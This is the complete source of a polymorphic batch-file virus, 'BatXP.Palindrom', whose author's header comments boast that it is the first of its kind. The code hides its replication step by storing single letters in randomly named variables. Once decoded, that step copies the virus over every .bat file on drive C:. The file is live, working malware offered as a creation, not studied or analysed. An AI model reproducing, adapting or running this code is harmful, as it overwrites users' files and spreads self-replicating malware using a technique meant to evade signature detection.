 
@echo off%Palindrom%
ReM Palindrom
ReM	----------- BatXP.Palindom <---> Second Part To Hell[rRlf] -----------	|Palindrom
ReM										|Palindrom
ReM	This is a polymorphic BatXP virus again. But it don't move the		|Palindrom
ReM	code. It's changing the encryption variables. It's a cool new thing I	|Palindrom
ReM	think. I have never seen this technique again in any Bat virus. That	|Palindrom
ReM	means, it's the first of it's kind.					|Palindrom
ReM										|Palindrom
ReM	*** Information about the virus:					|Palindrom
ReM	VirusName...............BatXP.Palindrom					|Palindrom
ReM	VirusAuthor.............Second Part To Hell[rRlf]			|Palindrom
ReM	Infection Way...........It infects every bat-file in every directory	|Palindrom
ReM				at the Drive C:\				|Palindrom
ReM	VirusSize...............3.700 Byte					|Palindrom
ReM	Encrypted...............Yes, but only the Virus-Part			|Palindrom
ReM				It's a "set-encryption".			|Palindrom
ReM	Polymorphic.............Yes, it changes it's encryption variables	|Palindrom
ReM				at every run.					|Palindrom
ReM	written on 27.03.2003							|Palindrom
ReM	in Austria								|Palindrom
ReM	----------------------------------------------------------------------	|Palindrom
ReM Palindrom
%Palindrom%echo. >checker.bat
%Palindrom%set crandc=0
:randgen	%Palindrom%
%Palindrom%set a=0
%Palindrom%set counter=0
%Palindrom%set name=
:stapoly	%Palindrom%
%Palindrom%set a=%random%
:polyst		%Palindrom%
%Palindrom%if %a% GEQ 50 (set /A a=%a%/3)
%Palindrom%if %a% LEQ 40 (set /A a=%a%+11)
%Palindrom%if %a% GEQ 50 (goto polyst)
%Palindrom%if %a% LSS 41 (goto polyst)
%Palindrom%set /A a=%a%-40
%Palindrom%set /A counter=%counter%+1
%Palindrom%if %a% EQU 1 (set name=%name%P)
%Palindrom%if %a% EQU 2 (set name=%name%a)
%Palindrom%if %a% EQU 3 (set name=%name%l)
%Palindrom%if %a% EQU 4 (set name=%name%i)
%Palindrom%if %a% EQU 5 (set name=%name%n)
%Palindrom%if %a% EQU 6 (set name=%name%d)
%Palindrom%if %a% EQU 7 (set name=%name%r)
%Palindrom%if %a% EQU 8 (set name=%name%o)
%Palindrom%if %a% EQU 9 (set name=%name%m)
%Palindrom%if %counter% LSS 5 goto stapoly
%Palindrom%set /A crandc=%crandc%+1
%Palindrom%echo %crandc%
%Palindrom%set name%crandc%=%name%
%Palindrom%if %crandc% LEQ 13 (goto randgen)
find "Palindrom" <%0>>checker.bat
set nmmnP=f
%aaaa%echo set %name1%=f>>checker.bat
find "aaaa" <%0>>checker.bat
set PPiia=o
%bbbb%echo set %name2%=o>>checker.bat
find "bbbb" <%0>>checker.bat
set ommod=r
%cccc%echo set %name3%=r>>checker.bat
find "cccc" <%0>>checker.bat
set amPmm=i
%dddd%echo set %name4%=i>>checker.bat
find "dddd" <%0>>checker.bat
set aomPl=n
%eeee%echo set %name5%=n>>checker.bat
find "eeee" <%0>>checker.bat
set lmmiP=b
%ffff%echo set %name6%=b>>checker.bat
find "ffff" <%0>>checker.bat
set armPa=a
%gggg%echo set %name7%=a>>checker.bat
find "gggg" <%0>>checker.bat
set odnmm=t
%hhhh%echo set %name8%=t>>checker.bat
find "hhhh" <%0>>checker.bat
set analm=d
%iiii%echo set %name9%=d>>checker.bat
find "iiii" <%0>>checker.bat
set immla=c
%jjjj%echo set %name10%=c>>checker.bat
find "jjjj" <%0>>checker.bat
set idlmr=p
%kkkk%echo set %name11%=p>>checker.bat
find "kkkk" <%0>>checker.bat
set Pimln=y
%llll%echo set %name12%=y>>checker.bat
find "llll" <%0>>checker.bat
find "mmmm" <%0>>checker.bat
%mmmm%echo %%%name1%%%%%%name2%%%%%%name3%%% /%%%name3%%% C:\ %%%%%%%name3%%% %%%name4%%%%%%name5%%% (*.%%%name6%%%%%%name7%%%%%%name8%%%) %%%name9%%%%%%name2%%% %%%name10%%%%%%name2%%%%%%name11%%%%%%name12%%% %%%name13%%%checker.bat %%%%%%%name3%%% >>checker.bat
%nmmnP%%PPiia%%ommod% /%ommod% C:\ %%%ommod% %amPmm%%aomPl% (*.%lmmiP%%armPa%%odnmm%) %analm%%PPiia% %immla%%PPiia%%idlmr%%Pimln% %iamnP%checker.bat %%%ommod% 
